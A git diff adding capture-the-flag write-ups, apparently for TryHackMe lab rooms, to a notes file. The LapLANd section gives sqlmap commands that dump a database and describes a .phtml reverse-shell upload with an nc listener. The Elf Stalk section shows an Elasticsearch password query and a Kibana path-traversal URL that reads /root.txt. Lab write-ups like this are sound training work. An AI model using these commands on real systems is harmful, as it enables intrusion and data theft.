@@ -657,10 +657,77 @@ px @rbp-0x8 #var_8h - value 9 - flag2
 
 ## LapLANd (SQL Injection)
 
+```markdown
+We are given a website for LapLANd, and we have to use SQLi to find the flags.
+
+We can use 'sqlmap' to check the website for SQLi-related vulnerabilities.
+```
+
 ```shell
+sqlmap -u http://10.10.237.109/index.php --forms
+#this gives us a lot of info about SQLi possibilities
+#log_email is SQL injectable
+
+sqlmap -u http://10.10.237.109/register.php --data="log_email=santa@gmail.com&log_password=santaclaus&login_button=Login" --method POST --dbs --batch
+#we can give any random credentials here, this is just to fill in some data
+#POST method is used
+#this is for database enumeration
+#we get 6 databases, with 'social' being important
+
+sqlmap -u http://10.10.237.109/register.php --data="log_email=santa@gmail.com&log_password=santaclaus&login_button=Login" --method POST -D social --dump all --batch
+#to fetch information from database 'social'
+#the dumped data contains a lot of information about the tables in 'social'
+```
+
+```markdown
+Santa Claus email address - bigman@shefesh.com
+The password hash is also given, which when cracked gives plaintext 'saltnpepper'
+Also, Santa is meeting at the station of Waterloo
+
+Now that we have found the clues, we need to login into LapLANd using the creds above.
+We have an option to post in the forum but we do not know if we can post .php shells
+
+So we can instead use a .phtml reverse-shell
+Using 'nc -nvlp 1234' we can listen on port 1234, and upload the .phtml reverse shell
+
+Once uploaded, we get access to the machine
+The flag can be found in /home/user/flag.txt
+
+THM{SHELLS_IN_MY_EGGNOG}
 ```
 
 ## Elf Stalk
 
 ```shell
+#start by scanning machine
+nmap -T4 -p- -A 10.10.91.185
+#as given in question, ELK stack is used
+```
+
+```markdown
+We get kibana-log.txt on <http://10.10.91.185:8000>
+
+Now, we have to search elastisearch database for password
+From Google, we know that we have to use /_search for that, and that gives us some clues.
+
+Furthermore, we can access Kibana on <http://10.10.91.185:5601> and Elasticsearch on <http://10.10.91.185:9200>
+
+We know that Kibana version is 6.4.2, so we will have to search for an exploit for that version
+
+Also, in order to search the Elasticsearch database, we have to use the /_search directory, and the q parameter.
+
+So, to search for password, we have to go to -
+<http://10.10.91.185:9200/_search?q=password>
+This gives us the password '9Qs58Ol3AXkMWLxiEyUyyf'
+
+Now, we have to read the contents of /root.txt, using an exploit for Kibana.
+
+<https://www.cyberark.com/resources/threat-research-blog/execute-this-i-know-you-have-it> - this covers details about the LFI exploit.
+
+We have to use that link, try the exploit and refer the Kibana logs available on <http://10.10.91.185:8000/kibana-log.txt> to get the password.
+
+As given in the blog, we visit the path traversal link -
+<http://10.10.91.185:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../root.txt>
+
+This generates errors in the Kibana logs and we can view the Reference Error, which reveals the flag 'someELKfun'.
 ```
